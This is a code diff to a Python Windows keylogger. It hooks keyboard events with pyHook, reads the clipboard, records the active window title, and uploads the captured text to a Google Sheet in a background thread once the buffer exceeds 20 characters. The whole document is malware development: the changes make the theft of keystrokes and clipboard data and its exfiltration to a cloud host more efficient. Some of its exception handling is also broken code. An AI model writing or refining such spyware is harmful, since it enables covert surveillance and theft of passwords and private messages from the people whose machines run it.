@@ -1,15 +1,15 @@
 # -*- coding: utf-8 -*-
 import pythoncom
 import pyHook
-import os
-import sys
 import win32event
 import win32api
+import win32clipboard
 import winerror
 import argparse
 import time
 import gspread
 from oauth2client.service_account import ServiceAccountCredentials
+from threading import Thread
 
 #Global variables
 PATH_LOGS = 'keylogs.txt'
@@ -51,15 +51,18 @@ class Keylogger():
         self.alt = 0
         self.lastclipboard = ''
         self._clipboard = ''
+        self.sheet = gsheetinit(GSHEET_KEY)
 
     # get clipboard data
     @property
     def clipboard(self):
-        import win32clipboard
         win32clipboard.OpenClipboard()
         tmp = win32clipboard.GetClipboardData()
         win32clipboard.CloseClipboard()
         return tmp
+
+    def decorator(self, keystring):
+        return '<'+keystring+'>'
 
     # Local storage of logs
     def local_logs(self):
@@ -77,18 +80,13 @@ class Keylogger():
 
     # Send logs to google form
     def gsheet_logs(self, data):
-        if len(data) > 20:
-            print('>Sending to the cloud<')
-            row = [self.context, time.ctime(), data]
-            index = 1
-            sheet = gsheetinit(GSHEET_KEY)
-            try:
-                sheet.insert_row(row, index)
-                self.data = ''
-            except:
-                print('error fatal man')
-            self.data = ''
-            print('yes')
+        print('>Sending to the cloud<')
+        row = [self.context, time.ctime(), data]
+        index = 1
+        try:
+            self.sheet.insert_row(row, index)
+        except event as e:
+            print(e)
         return True
 
     def corresp(self, key):
@@ -273,7 +271,7 @@ class Keylogger():
             else:
                 self.data += '='
         else:
-            self.data += key
+            self.data += self.decorator(key)
 
     def OnKeyboardEvent(self, event):
         data_logs = (event.WindowName, event.Window, event.Time, event.Ascii, event.KeyID, event.Key, event.Alt)
@@ -303,8 +301,13 @@ class Keylogger():
                 self.context = event.WindowName
                 self.context_chg = 1
             print(self.data)  # debugging
-            self.gsheet_logs(self.data)
             self.context_chg = 0
+        if len(self.data) > 20:
+            try:
+                Thread(target=self.gsheet_logs, args=(self.data,)).start()
+            except event as e:
+                print(e)
+            self.data = ''
         return True  # needs to return an integer value
 
     def OffKeyboardEvent(self, event):
